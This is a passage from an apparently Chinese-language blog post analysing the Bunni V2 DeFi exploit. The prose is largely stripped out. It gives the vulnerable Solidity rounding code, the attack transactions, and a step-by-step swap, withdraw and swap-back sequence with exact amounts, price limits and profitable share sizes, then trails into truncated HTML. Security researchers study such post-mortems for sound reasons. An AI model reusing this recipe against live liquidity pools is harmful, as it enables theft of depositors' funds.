https://etherscan.io/tx/0x1c27c4d625429acfc0f97e466eda725fd09ebdc77550e529ba4cbdbc33beb97b\n* https://uniscan.xyz/tx/0x4776f31156501dd456664cd3c91662ac8acc78358b9d4fd79337211eb6a1d451\n\n 0x047daf0df44f84a042596b46069842a297a1c81ae7b0372c92c8989bb947ebbc \n 0x5baBE600b9fCD5fB7b66c0611bF4896D967b23A1Arkham \"Gas.zip\"\n```\n\n## \n\n\n\n* https://blog.bunni.xyz/posts/exploit-post-mortem/#final-words\n* https://gist.github.com/giovannidisiena/716324d50b6649be3a0e91395890917e\n\nUnichain  weETH/ETH  ETH  USDC/USDT   ETH  USDC/USDT \n\n### \n\n BunniHub::withdraw() \n\n```solidity\n// decrease idle balance proportionally to the amount removed\n{\n    (uint256 balance, bool isToken0) = IdleBalanceLibrary.fromIdleBalance(state.idleBalance);\n>>> uint256 newBalance = balance - balance.mulDiv(shares, currentTotalSupply); // this line\n    if (newBalance != balance) {\n        s.idleBalance[poolId] = newBalance.toIdleBalance(isToken0);\n    }\n}\n```\n\n withdraw  idleBalance withdraw sharesidleBalance balance.mulDiv(shares, currentTotalSupply) \n\n```solidity\n/// @dev Returns `floor(x * y / d)`.\n/// Reverts if `x * y` overflows, or `d` is zero.\nfunction mulDiv(uint256 x, uint256 y, uint256 d) internal pure returns (uint256 z) {...}\n```\n\n **mulDiv**  idleBalance  activeBalance  defi  swap  swap / redeem  token \n\n## \n\n\n\n* **Swap**\n   3m USDT swap  spot price tick  5000 swap USDC  activeBalance0  USDC  1.835280870463e12  25 wei\n\n* **Withdraw**\n\n   44  **RoundingDown**  USDC  activeBalance0  25 wei  3 wei 88% totalLiquidity  5.83e16  9.114e15 84.4%\n\n* **SwapBack**\n\n   USDT -> USDC swap spot price tick  8391891 USDC = 2.77e36 USDT swap  totalLiquidity  9.114e15  1.065e16**16.8%** 2  totalLiquidity  USDC -> USDT swap\n\n1 1.33m USDC  1m USDT \n\n### \n\n\n\n* pool balance\n  * activeBalance token  swap \n  * idleBalance token token0  Uniswap V3   token0   idleBalance  rebalancing / surge\n* token0/token1 balancetoken0  token1 \n  * balance0 = rawBalance0 + previewRedeem(reserve0)\n  * balance1 = rawBalance1 + previewRedeem(reserve1)\n\n* totalLiquidityEstimate token0  token1 \n  * uint256 totalLiquidityEstimate0 = balance0.fullMulDiv(Q96, totalDensity0X96)\n  * uint256 totalLiquidityEstimate1 = balance1.fullMulDiv(Q96, totalDensity1X96)\n\n* updatedBalance0queryLDF  activeBalance \n  * updatedBalance0 = balance0 - idleBalance (QueryLDF.sol: line 85-92)\n\n\n\n\n* **CarpetedDoubleGeometricLiquidityDistributionFunction** TWAP  surge fee\n*  tick spacing tick spacing  1 activeBalance  idleBalance \n*  USDC/USDT  ETH/weETH \n*  /\n\nUSDC/USDT \n\n```javascript\ntoken0: USDC, token1: USDT\n\nstart poolState:\nreverse0: 1707778140002, reverse1: 806866315406\nrawBalance0: 356233315494, rawBalance1: 235446423830\nbalance0: 2152001610969, balance1: 1079504135619\nidleBalance: 316691975954, isToken0: true\n\nsqrtPriceX96: 79226236828369675893154619303, tick: -1\n\nLDF(Liquidity Density Function):\nliquidityDensityOfRoundedTickX96(liquidityDensityX96_): 21127509982676313354474563397\ndensity0RightOfRoundedTickX96(cumulativeAmount0DensityX96): 1980482907221483874998123\ndensity1LeftOfRoundedTickX96(cumulativeAmount1DensityX96): 924186629648334027225499\ntotalLiquidity: 58302026139899290\ntotalDensity0X96: 2494011626894250147759228\ntotalDensity1X96: 1466966669158546676419635\nliquidityDensityOfRoundedTickX96: 21127509982676313354474563397\n\nactiveBalance0: 1835280870463\nactiveBalance1: 1079504135618\n\nshouldSurge: false\nupdatedBalance0: 1835309635015\n\ntotalLiquidityEstimate0: 58302939913731650\ntotalLiquidityEstimate1: 58302026139899289\ntotalLiquidityEstimate0.fullMulX96(totalDensity0X96): 1835309635014\ntotalLiquidityEstimate0.fullMulX96(totalDensity1X96): 1079521054801\ntotalLiquidityEstimate1.fullMulX96(totalDensity0X96): 1835280870463\ntotalLiquidityEstimate1.fullMulX96(totalDensity1X96): 1079504135618\n```\n\n### \n\n 1. **Swap**\n\n     activeBalance0 \n\n    exactIn/exactOut/exactin 3  swap USDC  USDT USDC/USDT  activeBalance0  26 wei\n\n* \tswap 1 balance totalLiquidityEstimate0 & totalLiquidityEstimate1\n\n   ```javascript\n   1.7088106e7 USDT -> 2 wei USDC, exactIn\n   tick: -1, ~0.9999 USDT per USDC\n   sqrtPriceLimitX96: 79226236828369693485340663719 (pool.slot0s.sqrtPriceX96 + 2**44), tick limit: -1\n   ```\n\n   swap 1 \n\n   ![image-20250914011750017](../../assets/blog_img/2025-09-22/image-20250914011750017.png)\n\n    swap 1  sqrtPriceLimitX96 sqrtPriceX96 2**44BunniHub  swap  inputToken  outputTokenv3 inputToken  rawBalance \n\n   ```solidity\n   BunniHub:hookHandleSwap()\n   \n   // pull input claim tokens from hook\n   if (inputAmount != 0) {\n   \tzeroForOne ? state.rawBalance0 += inputAmount : state.rawBalance1 += inputAmount;\n   \tpoolManager.transferFrom(address(key.hooks), address(this), inputToken.toId(), inputAmount);\n   }\n   ```\n\n   swap 1 1.7088106e7  2 wei USDC~0.9999 USDT per USDC inputToken  rawBalance  rawBalance1  totalLiquidityEstimate1 **totalLiquidityEstimate0  totalLiquidityEstimate1** swap 2 \n\n   ````\n   uint256 totalLiquidityEstimate1 = balance1.fullMulDiv(Q96, totalDensity1X96);\n   \n   rawBalance1 -> balance1 -> totalLiquidityEstimate1 -> totalLiquidityEstimate1 > totalLiquidityEstimate0\n   ````\n\n* \tswap 2 reduce activeBalance0 to 499 wei\n\n   ```solidity\n   1.835492291952e12 USDT -> 1.835309634512e12(1835309635012 - 500) USDC, exactOut\n   tick: -1, ~0.9999 USDT per USDC\n   sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341, tick limit: 887272(max tickPrice)\n   ```\n\n   swap 2 \n\n   ![image-20250914014148538](../../assets/blog_img/2025-09-22/image-20250914014148538.png)\n\n    swap 2  exactOut  token0  activeBalance0  activeBalance0 - 500 \n\n    activeBalance0  499 wei\n\n   *  totalLiquidityEstimate0 \u003C totalLiquidityEstimate1  totalLiquidityEstimate0  totalLiquidity  activeBalance****swap 2  token0 \n\n    - fullMulX96  activeBalance0  updatedBalance0  1\n\n    LDF  totalLiquidityEstimate0  swap 2  activeBalance0\n\n* \tswap 3 reduce activeBalance0 to 25 wei\n\n   ```javascript\n   swap 3:\n   1e6 USDT -> 472 wei USDC, exactIn\n   tick: 3, ~1.0003 USDT per USDC\n   sqrtPriceLimitX96: 101729702841318637793976746270, tick limit: 5000\n   ```\n\n   swap 3 \n\n   ![image-20250914014220737](../../assets/blog_img/2025-09-22/image-20250914014220737.png)\n\n    swap 3 **1e6 USDT** USDC  activeBalanace0  25 weiswap 3 totalLiquidityEstimate1 \u003C totalLiquidityEstimate0 totalLiquidityEstimate1  totalLiquidity  activeBalance0\n\n    swap  swap  uniswapv4 unlock  1.835510380058e12 USDT 1.835309634986e12 USDC  uniswapv4  activeBalance0  1835280870463  25 wei **Rounding Trick** \n\n   shouldSurge  false / slot0s.lastSurgeTimestamp  **LDF  / **\n\n 2. **Withdraw**\n\n     withdraw shares activeBalance0  **3 wei**\n\n     **Rounding Down**  withdraw shares  withdraw  totalDensity0  activeBalance0  idleBalance  totalLiquidity  5.8303205157163981e16  9.114083388149667e15  activeBalance0  25 wei  3 wei\n\n    BunniHubLogic::withdraw  idleBalance **mulDiv**  withdraw  idleBalance updatedIdleBalance0 totalLiquidity  totalLiquidityEstimate  totalLiquidity  updatedBalance0 \n\n    ```solidity\n    Withdraw(): \n    uint256 idleBalance = idleBalance - idleBalance.mulDiv(shares, currentTotalSupply);\n    uint256 balance0 = ( rawbalance0 - rawbalance0.mulDiv(shares, currentTotalSupply) ) + \n    \t\t\t\t\t\t\t\t\tpreviewRedeem(reserve0) - previewRedeem(reserve0.mulDiv(shares, currentTotalSupply));\n    \n    floor(idleBalance * shares / totalSupply) -> idleBalance - floor(idleBalance * shares / totalSupply)\n    ```\n\n     QueryLDF.sol::QueryLDF  activeBalance0  totalLiquidity\n\n    ```solidity\n    QueryLDF():\n    (uint256 balance, bool isToken0) = IdleBalanceLibrary.fromIdleBalance(idleBalance);\n    balance0 = subReLU(balance0, balance); // updatedBalance0\n                \n    uint256 totalLiquidityEstimate0 = updatedBalance0.fullMulDiv(Q96, totalDensity0X96);\n    \n    if (totalLiquidityEstimate0 \u003C totalLiquidityEstimate1) {\n      totalLiquidity = roundUpFullMulDivResult(updatedBalance0, Q96, totalDensity0X96, totalLiquidityEstimate0);\n      (activeBalance0, activeBalance1) = (\n        FixedPointMathLib.min(balance0, totalLiquidityEstimate0.fullMulX96(totalDensity0X96)),\n      \tFixedPointMathLib.min(balance1, totalLiquidityEstimate0.fullMulX96(totalDensity1X96))\n      );\n    } else {\n      totalLiquidity = roundUpFullMulDivResult(updatedBalance1, Q96, totalDensity1X96, totalLiquidityEstimate1);\n      (activeBalance0, activeBalance1) = (\n       FixedPointMathLib.min(balance0, totalLiquidityEstimate1.fullMulX96(totalDensity0X96)),\n       FixedPointMathLib.min(balance1, totalLiquidityEstimate1.fullMulX96(totalDensity1X96))\n      );\n    }\n    ```\n\n     withdraw shares  activeBalance0  25 wei  3 wei totalLiquidity  5.8303205157163981e16  0.9114083388149667e16\n\n     withdrawal \n\n    ![image-20250914020525202](../../assets/blog_img/2025-09-22/image-20250914020525202.png)\n\n     withdrawal  withdraw shares  3.31262636100e11 idleBalance \n\n    ```\n    floor(3.16691975216e11 * 3.31262636100e11 / 1596.285784192335992906e18) = floor(65.72) = 65\n    ```\n\n     idleBalance  previewRedeem  delta previewRedeem(rawBalance0)  1 wei withdrawal 12 ~ 13 balance0  idleBalance  65 wei withdrawal 13 ~ 14balance0  idleBalance 1 wei 1 wei  QueryLDF  balance0 updatedBalance0 activeBalance0  1 wei withdrawal activeBalance0  3 wei\n\n     44 withdrawal \n\n    ![image-20250913123917118](../../assets/blog_img/2025-09-22/image-20250913123917118.png)\n\n    1.4363547901296e13 lp  activeBalance0  totalLiquidity \n\n3. **SwapBack**\n\n   **** USDC\n\n    swap  1  swap  USDT  USDC  tick839189 2.78e36 USDT/USDC   2  swap  1  swap  USDT  USDC  uniswapv4  **Flash Accounting**  token  token  takesync  settle  swap 4  uniswap v4  USDT  swap  uniswap v3  swap  token transfer \n\n   * swap 4 swap giant amount of USDT to USDC\n\n     ```\n     swap 4:\n     1e19 USDT -> 1 wei USDC, exactIn\n     tick: 5000, ~1.6487 USDT per USDC\n     sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341, tick limit: 887272 (TickMath.MAX_TICK)\n     ```\n\n     swap 4 \n\n     ![image-20250914020135697](../../assets/blog_img/2025-09-22/image-20250914020135697.png)\n\n      swap 4  1e19  USDT  USDC LDF  CarpetedDoubleGeometricDistribution 12 carpet  tick  twap  swap \n\n     swap 4  USDT  USDC tick  839189 2.78e36 USDT/USDCbalance0  idleBalance  activeBalance0 \n\n   * swap 5\n\n     ```\n     swap 5:\n     5.03177409646e11 USDC -> 1.0000002885864344623e19 USDT, exactOut\n     tick: 839189, ~2.78e36 USDT per USDC\n     sqrtPriceLimitX96: 4295128740, tick limit: -887272 (TickMath.MIN_TICK)\n     ```\n\n     swap 5 \n\n     ![image-20250914142352010](../../assets/blog_img/2025-09-22/image-20250914142352010.png)\n\n      swap 5  exactOut  swap 4 USDT99%** totalLiquidityEstimate0  totalLiquidity  token0  totalLiquidityEstimate1 **\n\n     ```\n     totalLiquidityEstimate0 =updatedBalance0 * 2**96 / totalDensity0X96= 237684487542793012780631851008\n     totalLiquidityEstimate1 =balance1 * 2**96 / totalDensity1X96= 10647207614202720\n     result: totalLiquidityEstimate1 \u003C totalLiquidityEstimate0\n     ```\n\n      **LiquidityEstimate 16%** swap 5  token0USDC USDT \n\n      5.03177409645e11 USDC  2.885864344623e12 USDT swap  1.332132228158e12 USDC  1.04145399071e12 USDT 2.3m \n\n## \n\n*  eth  lp \n\n* swap 1  totalLiquidityEstimate0  totalLiquidityEstimate1 USDTtoken1sqrtPriceLimitX96 token1  rawBalance1 totalLiquidityEstimate1\n\n*  withdraw shares  python  withdrawal  shares  withdrawal \n\n   shares \n\n  ```\n  205400000000 (19, 12)\t\t\t331300000000 (19, 11)\t\t\t\t457200000000 (19, 11)\n  205500000000 (19, 12)\t\t\t331400000000 (19, 11)\t\t\t\t457300000000 (19, 11)\n  205600000000 (19, 12)\t\t\t331500000000 (19, 11)\t\t\t\t457400000000 (19, 11)\n  205700000000 (19, 12)\t\t\t331600000000 (19, 11)\t\t\t\t457500000000 (19, 11)\n  205800000000 (19, 12)\t\t\t331700000000 (19, 11)\t\t\t\t457600000000 (19, 11)\n  205900000000 (19, 12)\t\t\t331800000000 (19, 11)\t\t\t\t457700000000 (19, 11)\n  206000000000 (19, 12)\t\t\t331900000000 (19, 11)\t\t\t\t457800000000 (19, 11)\n  206100000000 (19, 12)\t\t\t332000000000 (19, 11)\t\t\t\t457900000000 (19, 11)\n  206200000000 (19, 12)\t\t\t332100000000 (19, 11)\t\t\t\t458000000000 (19, 11)\n  206300000000 (19, 12)\t\t\t332200000000 (19, 11)\t\t\t\t458100000000 (19, 11)\n  206400000000 (19, 12)\t\t\t332300000000 (19, 11)\t\t\t\t458200000000 (19, 11)\n  206500000000 (19, 12)\t\t\t332400000000 (19, 11)\t\t\t\t458300000000 (19, 11)\n  206600000000 (19, 12)\t\t\t332500000000 (19, 11)\t\t\t\t458400000000 (19, 11)\n                            332600000000 (19, 11)\t\t\t\t458500000000 (19, 11)\n                            357800000000 (19, 15)\t\t\t\t458600000000 (19, 11)\n                                                   \t\t\t483700000000 (19, 15)\n                                                   \t\t\t483800000000 (19, 15)\n  \n   withdraw abs(deltaActiveBalance)\n   205400000000 (19, 12) : shares  205400000000, 19  withdrawal  12  withdrawal  1\n  ```\n\n*  activeBalance0  2  200k  activeBalance0  2 \n\n  \n\n  ```\n  withdrawSharesAmount: 205900000000, iter: 42, profit: 1.509580494886e12 usdc + 1.04145398069e12 usdt\n  withdrawSharesAmount: 331600000000, iter: 44, profit: 1.509580494886e12 usdc + 1.04145398069e12 usdt\n  withdrawSharesAmount: 457700000000, iter: 46, profit: 1.509580494886e12 usdc + 1.04145398069e12 usdt\n  ```","src/content/blog/2025-09-22-BunniV2-Exploit-Analysis.md",[150,151,152,153,154,155,156,157],"../../assets/blog_img/2025-09-22/image-20250914011750017.png","../../assets/blog_img/2025-09-22/image-20250914014148538.png","../../assets/blog_img/2025-09-22/image-20250914014220737.png","../../assets/blog_img/2025-09-22/image-20250914020525202.png","../../assets/blog_img/2025-09-22/image-20250913123917118.png","../../assets/blog_img/2025-09-22/image-20250914020135697.png","../../assets/blog_img/2025-09-22/image-20250914142352010.png","/src/assets/blog_img/2025-09-22/bunni.jpg","66edabbe2d0a207e",{"html":160,"metadata":161},"\u003C!-- # BunniV2 Exploit Analysis -->\n\u003Cp>202592 Bunni V2 840  Unichain  weETH/ETH  ETH  USDC/USDT\u003C/p>\n\u003Cp>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>* https://etherscan.io/tx/0x1c27c4d625429acfc0f97e466eda725fd09ebdc77550e529ba4cbdbc33beb97b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>* https://uniscan.xyz/tx/0x4776f31156501dd456664cd3c91662ac8acc78358b9d4fd79337211eb6a1d451\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 0x047daf0df44f84a042596b46069842a297a1c81ae7b0372c92c8989bb947ebbc \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 0x5baBE600b9fCD5fB7b66c0611bF4896D967b23A1Arkham \"Gas.zip\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"\">\u003C/h2>\n\u003Cp>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://blog.bunni.xyz/posts/exploit-post-mortem/#final-words\">https://blog.bunni.xyz/posts/exploit-post-mortem/#final-words\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://gist.github.com/giovannidisiena/716324d50b6649be3a0e91395890917e\">https://gist.github.com/giovannidisiena/716324d50b6649be3a0e91395890917e\u003C/a>\u003C/li>\n\u003C/ul>\n\u003Cp>Unichain  weETH/ETH  ETH  USDC/USDT   ETH  USDC/USDT \u003C/p>\n\u003Ch3 id=\"\">\u003C/h3>\n\u003Cp> BunniHub::withdraw() \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"solidity\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// decrease idle balance proportionally to the amount removed\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    (\u003C/span>\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> balance, \u003C/span>\u003Cspan style=\"color:#79B8FF\">bool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> isToken0) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> IdleBalanceLibrary.\u003C/span>\u003Cspan style=\"color:#B392F0\">fromIdleBalance\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(state.idleBalance);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">>>>\u003C/span>\u003Cspan style=\"color:#79B8FF\"> uint256\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> newBalance \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> balance \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> balance.\u003C/span>\u003Cspan style=\"color:#B392F0\">mulDiv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(shares, currentTotalSupply); \u003C/span>\u003Cspan style=\"color:#6A737D\">// this line\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (newBalance \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> balance) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        s.idleBalance[poolId] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> newBalance.\u003C/span>\u003Cspan style=\"color:#B392F0\">toIdleBalance\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(isToken0);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp> withdraw  idleBalance withdraw sharesidleBalance balance.mulDiv(shares, currentTotalSupply) \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"solidity\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">/// \u003C/span>\u003Cspan style=\"color:#F97583\">@dev\u003C/span>\u003Cspan style=\"color:#6A737D\"> Returns `floor(x * y / d)`.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">/// Reverts if `x * y` overflows, or `d` is zero.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">function\u003C/span>\u003Cspan style=\"color:#B392F0\"> mulDiv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#FFAB70\"> x\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#FFAB70\"> y\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#FFAB70\"> d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">internal\u003C/span>\u003Cspan style=\"color:#F97583\"> pure\u003C/span>\u003Cspan style=\"color:#F97583\"> returns\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#FFAB70\"> z\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {...}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp> \u003Cstrong>mulDiv\u003C/strong>  idleBalance  activeBalance  defi  swap  swap / redeem  token \u003C/p>\n\u003Ch2 id=\"\">\u003C/h2>\n\u003Cp>\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>Swap\u003C/strong>\n 3m USDT swap  spot price tick  5000 swap USDC  activeBalance0  USDC  1.835280870463e12  25 wei\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Withdraw\u003C/strong>\u003C/p>\n\u003Cp> 44  \u003Cstrong>RoundingDown\u003C/strong>  USDC  activeBalance0  25 wei  3 wei 88% totalLiquidity  5.83e16  9.114e15 84.4%\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>SwapBack\u003C/strong>\u003C/p>\n\u003Cp> USDT -> USDC swap spot price tick  8391891 USDC = 2.77e36 USDT swap  totalLiquidity  9.114e15  1.065e16\u003Cstrong>16.8%\u003C/strong> 2  totalLiquidity  USDC -> USDT swap\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>1 1.33m USDC  1m USDT \u003C/p>\n\u003Ch3 id=\"\">\u003C/h3>\n\u003Cp>\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>pool balance\u003C/p>\n\u003Cul>\n\u003Cli>activeBalance token  swap \u003C/li>\n\u003Cli>idleBalance token token0  Uniswap V3   token0   idleBalance  rebalancing / surge\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>token0/token1 balancetoken0  token1 \u003C/p>\n\u003Cul>\n\u003Cli>balance0 = rawBalance0 + previewRedeem(reserve0)\u003C/li>\n\u003Cli>balance1 = rawBalance1 + previewRedeem(reserve1)\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>totalLiquidityEstimate token0  token1 \u003C/p>\n\u003Cul>\n\u003Cli>uint256 totalLiquidityEstimate0 = balance0.fullMulDiv(Q96, totalDensity0X96)\u003C/li>\n\u003Cli>uint256 totalLiquidityEstimate1 = balance1.fullMulDiv(Q96, totalDensity1X96)\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>updatedBalance0queryLDF  activeBalance \u003C/p>\n\u003Cul>\n\u003Cli>updatedBalance0 = balance0 - idleBalance (QueryLDF.sol: line 85-92)\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003Cp>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>CarpetedDoubleGeometricLiquidityDistributionFunction\u003C/strong> TWAP  surge fee\u003C/li>\n\u003Cli> tick spacing tick spacing  1 activeBalance  idleBalance \u003C/li>\n\u003Cli> USDC/USDT  ETH/weETH \u003C/li>\n\u003Cli> /\u003C/li>\n\u003C/ul>\n\u003Cp>USDC/USDT \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"javascript\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">token0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">USDC\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#B392F0\">token1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">USDT\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">start \u003C/span>\u003Cspan style=\"color:#B392F0\">poolState\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">reverse0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1707778140002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#B392F0\">reverse1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">806866315406\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">rawBalance0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">356233315494\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#B392F0\">rawBalance1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">235446423830\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">balance0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">2152001610969\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#B392F0\">balance1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1079504135619\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">idleBalance\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">316691975954\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#B392F0\">isToken0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">true\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">sqrtPriceX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">79226236828369675893154619303\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#B392F0\">tick\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">LDF\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(Liquidity Density Function):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">liquidityDensityOfRoundedTickX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(liquidityDensityX96_): \u003C/span>\u003Cspan style=\"color:#79B8FF\">21127509982676313354474563397\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">density0RightOfRoundedTickX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(cumulativeAmount0DensityX96): \u003C/span>\u003Cspan style=\"color:#79B8FF\">1980482907221483874998123\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">density1LeftOfRoundedTickX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(cumulativeAmount1DensityX96): \u003C/span>\u003Cspan style=\"color:#79B8FF\">924186629648334027225499\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">totalLiquidity\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">58302026139899290\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">totalDensity0X96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">2494011626894250147759228\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">totalDensity1X96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1466966669158546676419635\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">liquidityDensityOfRoundedTickX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: 